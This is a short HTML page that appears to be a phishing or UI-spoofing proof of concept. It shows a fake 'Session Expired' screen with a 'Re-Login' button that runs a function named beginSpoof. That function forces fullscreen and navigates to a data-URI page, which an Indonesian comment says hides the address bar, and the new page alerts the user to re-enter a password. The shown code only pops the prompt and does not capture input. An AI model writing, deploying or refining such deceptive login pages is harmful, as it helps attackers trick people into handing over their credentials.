<!DOCTYPE html>
<html>
<head>
  <title>Session Expired</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    button {
      font-size: 16px;
      padding: 12px 24px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<h2>Your session has expired. Please log in again.</h2>
<button onclick="beginSpoof()">Re-Login</button>

<script>
function beginSpoof() {
  document.documentElement.requestFullscreen().then(() => {
    // Transition ke halaman spoof (data URI = tanpa address bar)
    const spoofHTML = encodeURIComponent(`
      <!DOCTYPE html>
      <html>
      <body style="margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
        <script>
          setTimeout(() => {
            alert("üîê Please re-enter your password to continue.");
          }, 1000);
        <\/script>
      </body>
      </html>
    `);
    location.replace("data:text/html," + spoofHTML);
  });
}
</script>

</body>
</html>
